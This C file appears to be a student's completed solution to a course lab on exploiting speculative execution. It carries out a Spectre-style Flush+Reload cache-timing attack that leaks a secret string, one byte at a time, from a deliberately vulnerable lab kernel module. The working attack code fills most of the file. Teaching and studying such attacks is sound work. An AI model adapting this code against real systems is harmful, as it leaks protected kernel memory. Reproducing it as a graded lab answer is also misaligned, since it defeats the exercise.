/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define THRESHOLD 180 
#define ATTEMPTS 400

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

// HELPER METHOD 
static unsigned char leak_one_byte_part1(int kernel_fd, char *shared_memory, size_t offset) {
    int candidates[256] = {0};

    for (int attempt = 0; attempt < ATTEMPTS; attempt++) { // ATTEMPTS defined above, can increase/decrease for fine tuning
        for (int i = 0; i < 256; i++) {
            clflush(&shared_memory[i * 4096]); // page table size 4096, loop goes through and flushes all pages
        }

        call_kernel_part1(kernel_fd, shared_memory, offset); // run victim process!!

        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) & 255; // mixed order to counter prefetching optimization
            char *addr = &shared_memory[mix_i * 4096];
            uint64_t dt = time_access(addr); // measure access time to mix_i-th page
            if (dt < THRESHOLD) {
                candidates[mix_i]++;
            }
        }
    }

    // find candidate for fastest access time, meaning victim accessed it
    int best = 0;
    for (int i = 1; i < 256; i++) {
        if (candidates[i] > candidates[best]) best = i;
    }
    return (unsigned char)best;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[64];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    // [Part 1]- Fill this in!
    // Feel free to create helper methods as necessary.
    // Use "call_kernel_part1" to interact with the kernel module
    // Find the value of leaked_byte for offset "current_offset"
    // leaked_byte = ??

    // my implementation!!

    char leaked_byte;

    for (current_offset = 0; current_offset < 64; current_offset++) {// loop through chars, since one char is each offset and there's a max of 64 chars, there's 64 offsets

        leaked_byte = (char)leak_one_byte_part1(kernel_fd, shared_memory, current_offset); // leak byte at current_offset
        leaked_str[current_offset] = leaked_byte; // store byte in string array

        if (leaked_byte == '\x00') { // check for null terminator
            printf("\nBroke at offset: %ld\n", current_offset);
            break;
        }
    }
    
    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    // no longer my implementation!!

    close(kernel_fd);
    return EXIT_SUCCESS;
}


